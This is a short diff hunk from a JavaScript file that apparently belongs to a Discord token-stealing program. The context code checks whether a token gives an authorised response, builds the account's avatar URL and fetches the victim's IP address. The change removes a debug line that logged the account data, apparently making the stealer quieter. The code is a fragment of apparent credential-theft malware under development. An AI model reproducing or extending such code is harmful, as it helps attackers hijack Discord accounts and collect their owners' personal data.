@@ -72,7 +72,6 @@ if (process.platform === "win32") {
         .then((_) => _.json())
         .then((res) => {
           if (res.message !== "401: Unauthorized") {
-            console.log(res);
             (async () => {
               var avatar = res.avatar ? `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png` : `https://cdn.discordapp.com/embed/avatars/${Math.floor(Math.random() * 6)}.png`
               const ip = await get_ip();
